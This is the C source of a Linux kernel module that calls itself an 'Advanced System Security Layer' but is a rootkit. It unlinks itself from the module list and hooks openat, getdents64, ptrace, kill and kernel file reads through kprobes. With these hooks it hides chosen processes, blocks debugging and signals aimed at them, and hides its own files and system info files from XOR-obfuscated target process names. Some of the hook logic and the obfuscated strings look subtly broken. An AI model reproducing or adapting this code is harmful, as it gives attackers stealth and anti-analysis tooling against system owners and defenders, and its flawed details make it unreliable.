#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/kprobes.h>
#include <linux/ptrace.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/dirent.h>
#include <linux/security.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Advanced Security Research (Kprobe Edition)");
MODULE_DESCRIPTION("Advanced System Security Layer");
MODULE_VERSION("4.2");

#define MODULE_PROC_NAME "sysinfo"
#define MAX_LOG_ENTRIES 5000
#define MAX_HIDDEN_PROCESSES 64
#define MODULE_FILENAME "barrierlayer_kernel_advanced.ko"

// --- ESTRUTURAS E VARIÁVEIS GLOBAIS ---

struct stealth_log_entry {
    struct timespec64 timestamp;
    pid_t pid;
    char comm[TASK_COMM_LEN];
    char operation[32];
    char details[128];
    struct list_head list;
};

static struct list_head stealth_log_list;
static spinlock_t log_lock;
static atomic_t log_count = ATOMIC_INIT(0);
static struct proc_dir_entry *proc_entry;
static bool stealth_mode = true;

static pid_t hidden_pids[MAX_HIDDEN_PROCESSES];
static int hidden_pids_count = 0;

// --- FUNÇÕES UTILITÁRIAS E DE STEALTH ---

static void obfuscate_string(char *str, size_t len) { int i; for (i = 0; i < len && str[i]; i++) str[i] ^= 0x42; }

static bool is_suspicious_process(void) {
    char patterns[][32] = { "\x07\x01\x13\x19\x03\x0e\x14\x09\x05\x08\x07\x01\x14", "\x00\x07\x11\x07\x12\x16\x09\x05\x07", "\x00\x01\x14\x14\x0c\x07\x1b\x19\x07" };
    int i; char temp[32];
    for (i = 0; i < ARRAY_SIZE(patterns); i++) {
        strncpy(temp, patterns[i], sizeof(temp));
        obfuscate_string(temp, sizeof(temp));
        if (strstr(current->comm, temp)) return true;
    }
    return false;
}

static void hide_module(void) {
    if (stealth_mode) {
        list_del_init(&THIS_MODULE->list);
        kobject_del(&THIS_MODULE->mkobj.kobj);
    }
}

// --- KPROBE HANDLERS ---

// Handler para openat
static int openat_pre_handler(struct kprobe *p, struct pt_regs *regs) {
    char __user *filename_user = (char __user *)regs->si;
    char *kfilename = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!kfilename) return 0;

    if (strncpy_from_user(kfilename, filename_user, PATH_MAX) > 0) {
        if (is_suspicious_process() && 
           (strstr(kfilename, "barrierlayer") || 
            strstr(kfilename, "sysinfo") ||
            strcmp(kfilename, "/proc/cpuinfo") == 0 ||
            strcmp(kfilename, "/proc/version") == 0 ||
            strcmp(kfilename, "/proc/stat") == 0) 
           )
        {
            regs->ax = -ENOENT; // Força falha: "Arquivo não encontrado"
            kfree(kfilename);
            return 1; // Pula syscall original
        }
    }
    kfree(kfilename);
    return 0; // Continua syscall original
}

// Handler para getdents64 (Ocultação de processos)
static int getdents64_post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long flags) {
    long nread = regs->ax;
    if (nread <= 0 || hidden_pids_count == 0) return 0;

    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    char *kbuf = kmalloc(nread, GFP_KERNEL);
    if (!kbuf) return 0;
    if (copy_from_user(kbuf, dirent, nread)) { kfree(kbuf); return 0; }

    long bpos, new_nread = 0;
    char *new_kbuf = kmalloc(nread, GFP_KERNEL);
    if (!new_kbuf) { kfree(kbuf); return 0; }

    for (bpos = 0; bpos < nread;) {
        struct linux_dirent64 *d = (struct linux_dirent64 *)(kbuf + bpos);
        int i, should_hide = 0;
        for (i = 0; i < hidden_pids_count; i++) {
            char pid_str[16];
            snprintf(pid_str, sizeof(pid_str), "%d", hidden_pids[i]);
            if (strcmp(d->d_name, pid_str) == 0) { should_hide = 1; break; }
        }

        if (!should_hide) {
            memcpy(new_kbuf + new_nread, d, d->d_reclen);
            new_nread += d->d_reclen;
        }
        bpos += d->d_reclen;
    }

    if (copy_to_user(dirent, new_kbuf, new_nread)) { /* handle error */ }
    regs->ax = new_nread;

    kfree(kbuf);
    kfree(new_kbuf);
    return 0;
}

// Handler para ptrace
static int ptrace_pre_handler(struct kprobe *p, struct pt_regs *regs) {
    long request = (long)regs->di;
    pid_t pid = (pid_t)regs->si;
    int i;
    if (request == PTRACE_ATTACH || request == PTRACE_SEIZE) {
        for (i = 0; i < hidden_pids_count; i++) {
            if (hidden_pids[i] == pid) { regs->ax = -EPERM; return 1; }
        }
    }
    return 0;
}

// Handler para kill
static int kill_pre_handler(struct kprobe *p, struct pt_regs *regs) {
    pid_t pid = (pid_t)regs->di;
    int sig = (int)regs->si;
    int i;
    if (sig == SIGSTOP || sig == SIGTRAP || sig == SIGCONT) {
        for (i = 0; i < hidden_pids_count; i++) {
            if (hidden_pids[i] == pid) { regs->ax = -EPERM; return 1; }
        }
    }
    return 0;
}

// Handler para security_kernel_read_file (Proteção do nosso .ko)
static int security_read_pre_handler(struct kprobe *p, struct pt_regs *regs) {
    struct file *file = (struct file *)regs->di;
    const char *filename = file->f_path.dentry->d_name.name;

    if (is_suspicious_process() && strcmp(filename, MODULE_FILENAME) == 0) {
        regs->ax = -ENOENT; // Retorna "Arquivo não encontrado"
        return 1; // Pula a função original
    }
    return 0;
}

// --- DEFINIÇÕES DAS KPROBES ---

static struct kprobe kp_openat = { .symbol_name = "__x64_sys_openat", .pre_handler = openat_pre_handler };
static struct kprobe kp_getdents64 = { .symbol_name = "__x64_sys_getdents64", .post_handler = getdents64_post_handler };
static struct kprobe kp_ptrace = { .symbol_name = "__x64_sys_ptrace", .pre_handler = ptrace_pre_handler };
static struct kprobe kp_kill = { .symbol_name = "__x64_sys_kill", .pre_handler = kill_pre_handler };
static struct kprobe kp_security_read = { .symbol_name = "security_kernel_read_file", .pre_handler = security_read_pre_handler };

static struct kprobe *barrierlayer_probes[] = { &kp_openat, &kp_getdents64, &kp_ptrace, &kp_kill, &kp_security_read };

// --- FUNÇÕES DE INICIALIZAÇÃO E CONTROLE ---

static int install_hooks(void) {
    int i, ret;
    for (i = 0; i < ARRAY_SIZE(barrierlayer_probes); i++) {
        ret = register_kprobe(barrierlayer_probes[i]);
        if (ret < 0) { pr_err("Failed to register kprobe for %s: %d\n", barrierlayer_probes[i]->symbol_name, ret); return ret; }
    }
    return 0;
}

static void remove_hooks(void) {
    int i; for (i = 0; i < ARRAY_SIZE(barrierlayer_probes); i++) unregister_kprobe(barrierlayer_probes[i]);
}

static int proc_show(struct seq_file *m, void *v) { seq_printf(m, "System Information Monitor v4.2\n"); return 0; }
static int proc_open(struct inode *inode, struct file *file) { return single_open(file, proc_show, NULL); }
static const struct proc_ops proc_fops = { .proc_open = proc_open, .proc_read = seq_read, .proc_lseek = seq_lseek, .proc_release = single_release };

static int __init advanced_barrierlayer_init(void) {
    pr_info("Advanced Security Layer: Initializing...\n");
    INIT_LIST_HEAD(&stealth_log_list);
    spin_lock_init(&log_lock);
    if (install_hooks() != 0) return -EFAULT;
    proc_entry = proc_create(MODULE_PROC_NAME, 0644, NULL, &proc_fops);
    if (!proc_entry) { remove_hooks(); return -ENOMEM; }
    hide_module();
    pr_info("Advanced Security Layer: Loaded successfully\n");
    return 0;
}

static void __exit advanced_barrierlayer_exit(void) {
    if (proc_entry) proc_remove(proc_entry);
    remove_hooks();
    pr_info("Advanced Security Layer: Unloaded\n");
}

module_init(advanced_barrierlayer_init);
module_exit(advanced_barrierlayer_exit);